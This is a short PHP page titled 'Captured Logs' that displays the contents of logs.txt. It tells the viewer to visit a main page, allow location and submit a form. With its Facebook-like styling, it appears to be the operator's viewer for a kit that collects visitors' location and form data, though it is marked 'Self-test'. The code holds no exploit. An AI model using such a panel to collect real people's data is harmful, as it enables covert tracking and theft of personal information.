<?php
$logFile = 'logs.txt';
if (!file_exists($logFile) || filesize($logFile) == 0) {
    $content = "<p style='color:#606770;'>😴 No logs yet. Visit the <a href='/' style='color:#1877f2;'>main page</a>, allow location, and submit the form.</p>";
} else {
    $content = nl2br(htmlspecialchars(file_get_contents($logFile)));
}
?>
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Captured Logs</title>
<style>
body{background:#f0f2f5;font-family:Segoe UI,sans-serif;padding:30px;margin:0}
.container{max-width:900px;margin:0 auto;background:#fff;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);padding:30px}
h1{color:#1a1f36;border-bottom:3px solid #1877f2;padding-bottom:12px}
.log-entry{background:#f8f9fa;border-radius:6px;padding:16px;margin-top:10px;font-family:monospace;font-size:14px;white-space:pre-wrap;border-left:4px solid #1877f2;line-height:1.6}
.footer{margin-top:24px;font-size:13px;color:#8c9ba8;text-align:center;border-top:1px solid #e6ecf0;padding-top:16px}
</style>
</head>
<body>
<div class="container">
<h1>📋 Captured Logs <span style="background:#1877f2;color:#fff;padding:2px 12px;border-radius:30px;font-size:14px;font-weight:600;">Self‑test</span></h1>
<div class="log-entry"><?= $content ?></div>
<div class="footer">🔒 This page is visible only to you.</div>
</div>
</body>
</html>